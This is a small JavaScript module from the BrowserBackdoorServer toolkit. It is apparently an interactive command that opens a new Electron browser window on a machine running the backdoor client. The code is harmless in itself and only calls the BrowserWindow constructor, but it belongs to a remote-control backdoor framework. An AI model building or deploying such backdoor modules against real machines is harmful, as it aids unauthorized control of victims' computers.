// INTERACTIVE
/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Creates a new browser window
 * Parameters: BrowserWindow options
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');
if (typeof BrowserWindow == 'undefined') BrowserWindow = electron.BrowserWindow;

function createWindow(options) {
    if (typeof win == 'undefined') win = new BrowserWindow(options); 
}

return "Usage: createWindow(options). Options are avaliable here: http://electron.atom.io/docs/api/browser-window/#new-browserwindowoptions";
